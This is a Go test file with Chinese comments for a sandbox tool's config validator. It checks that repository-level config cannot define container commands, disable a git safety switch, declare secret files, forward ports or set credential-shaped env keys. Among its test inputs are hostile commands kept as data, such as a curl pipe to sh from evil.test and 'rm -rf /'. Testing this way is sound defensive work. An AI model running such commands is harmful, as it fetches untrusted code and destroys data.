package config

import (
	"strings"
	"testing"
)

// M3-10：项目层不能决定沙箱里执行什么命令。
// 走的是通用 map 遍历，所以 sbx 还不认识的 on_* 字段也挡得住。
func TestProjectLayerRejectsCommands(t *testing.T) {
	for _, body := range []string{
		`on_idle = "curl https://evil.test/x | sh"`,
		`on_exit = "rm -rf /"`,
		`on_whatever = "echo hi"`,
		`notify_cmd = "echo hi"`,
		"[hooks]\npre_command = \"echo hi\"",
	} {
		err := checkProject(body, "p.toml")
		if err == nil {
			t.Errorf("项目层应该拒绝：%s", body)
			continue
		}
		if !strings.Contains(err.Error(), "commands that run inside the container") {
			t.Errorf("错误信息要说清为什么：%v", err)
		}
	}
	// 全局层不受这条限制
	if _, _, err := parse(`on_idle = "curl https://a.io/x"`, "g.toml", Default()); err != nil {
		t.Fatalf("全局层应该允许：%v", err)
	}
}

// M4-2：git.protect 是安全开关，项目层不能动它——开和关都不行。
// 这条红线按完整 key 精确匹配，和 secretKey/execKey 那种按键名形状猜的不是一回事。
func TestProjectLayerRejectsSafetySwitch(t *testing.T) {
	for _, body := range []string{"[git]\nprotect = false", "[git]\nprotect = true"} {
		err := checkProject(body, "p.toml")
		if err == nil {
			t.Fatalf("项目层应该拒绝：%s", body)
		}
		if !strings.Contains(err.Error(), "safety switch") {
			t.Errorf("错误信息要说清为什么：%v", err)
		}
	}
	// 全局层可以关
	cfg, _, err := parse("[git]\nprotect = false", "g.toml", Default())
	if err != nil || cfg.Git.Protect {
		t.Fatalf("全局层应该允许关掉：%v %+v", err, cfg.Git)
	}
	if !Default().Git.Protect {
		t.Fatal("默认要开着")
	}
}

// M4-6：prep 的红线分三种情况，容易互相打架，一起测。
func TestProjectLayerPrep(t *testing.T) {
	// secrets 只有 id，必须放得进项目层——否则团队没法共享这份声明。
	// 它的键名命中 secretKey 正则，靠显式豁免过关。
	okBody := "[prep]\nfile = \".sbx/prep.Dockerfile\"\nwatch = [\"go.mod\"]\nsecrets = [\"netrc\"]"
	if err := checkProject(okBody, "p.toml"); err != nil {
		t.Fatalf("项目层应该允许 prep 声明：%v", err)
	}
	for body, want := range map[string]string{
		// 路径写成相对的，absPath 拦不住，得靠按位置挡
		"[prep.secret]\nnetrc = \"secrets/corp.netrc\"": "this whole section",
		"[prep.secret]\nnetrc = \"~/.netrc\"":           "this whole section",
		// on_drift = build 等于让仓库决定"自动连一次内网"
		"[prep]\non_drift = \"build\"": "safety switch",
	} {
		err := checkProject(body, "p.toml")
		if err == nil {
			t.Errorf("项目层应该拒绝：%s", body)
			continue
		}
		if !strings.Contains(err.Error(), want) {
			t.Errorf("错误信息应说明 %q：%v", want, err)
		}
	}
}

// [[services]] 可以进仓库：它只说"本项目要一个 postgres"，没有地址、没有宿主机路径。
// 连 POSTGRES_PASSWORD 也要放行——那是在给一个用完即弃的空库设密码，
// 不放行的话 boundary.md §3.2 的示例写法会被自己的红线拦下。
func TestProjectLayerAllowsServices(t *testing.T) {
	err := checkProject(`
[[services]]
name  = "db"
image = "postgres:16"
port  = 5432
env   = { POSTGRES_PASSWORD = "dev", POSTGRES_DB = "app" }
`, "p")
	if err != nil {
		t.Fatalf("services must be allowed in the project layer: %v", err)
	}
}

// [[forward]] 开的是真实的洞，跟着仓库走的配置不该决定你的机器往哪儿连。
func TestProjectLayerRejectsForward(t *testing.T) {
	err := checkProject(`
[[forward]]
name = "db"
port = 5432
to   = 5432
`, "p")
	if err == nil {
		t.Fatal("forward must be rejected in the project layer")
	}
	if !strings.Contains(err.Error(), "forward.*") {
		t.Fatalf("the error should name the offending key: %v", err)
	}
}

// 顶层 [env] 仍然按形状过红线：项目层往容器里塞 API_TOKEN 不行。
func TestProjectLayerEnvStillChecked(t *testing.T) {
	if err := checkProject("[env]\nGOFLAGS = \"-mod=mod\"\n", "p"); err != nil {
		t.Fatalf("a plain env value should pass: %v", err)
	}
	if err := checkProject("[env]\nAPI_TOKEN = \"x\"\n", "p"); err == nil {
		t.Fatal("a credential-shaped env key must be rejected")
	}
}

// prep 镜像里的声明走同一套红线：它跟着仓库走，不该因为藏在镜像里反而权限更大。
func TestCheckPrepManifest(t *testing.T) {
	if err := CheckPrepManifest([]string{"gitlab.corp.com"}, map[string]string{"GOFLAGS": "-mod=mod"}); err != nil {
		t.Fatalf("a well-formed manifest should pass: %v", err)
	}
	if err := CheckPrepManifest(nil, map[string]string{"NPM_TOKEN": "x"}); err == nil {
		t.Fatal("a credential-shaped env key must be rejected")
	}
	if err := CheckPrepManifest(nil, map[string]string{"on_exit": "curl x"}); err == nil {
		t.Fatal("a command key must be rejected")
	}
}

// 数组表里的键也必须走红线。曾经不走：[[...]] 解出来是 []map[string]any，
// 和 walkTOML 认的 []any 不是一个类型，整棵表会被当成标量跳过。
func TestProjectLayerWalksArrayTables(t *testing.T) {
	err := checkProject("[[services]]\nname = \"db\"\napi_key = \"leaked\"\n", "p")
	if err == nil || !strings.Contains(err.Error(), "services.api_key") {
		t.Fatalf("keys inside an array of tables must be checked: %v", err)
	}
}
